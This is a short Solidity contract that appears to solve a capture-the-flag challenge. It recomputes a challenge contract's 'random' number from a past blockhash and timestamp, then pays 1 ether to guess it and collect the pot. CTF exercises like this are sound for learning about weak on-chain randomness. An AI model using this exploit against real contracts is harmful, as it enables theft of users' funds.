// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

import "./GuessTheRandomNumber.sol";

//PRN games can be guessed by checking and revert if not won.

contract Solution3v04 {
    GuessTheRandomNumberChallenge public victim;
    uint256 deployBlockNumber;
    uint256 deployTime;

    function Solution3v04(GuessTheRandomNumberChallenge victim_, uint256 deployBlockNumber_, uint256 deployTime_) public {
        victim = victim_;
        deployBlockNumber = deployBlockNumber_;
        deployTime = deployTime_;
    }

    function attack() external payable {
        uint8 answer = uint8(keccak256(block.blockhash(deployBlockNumber - 1), deployTime));
        victim.guess.value(1 ether)(answer);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    function() external payable {
    }
}
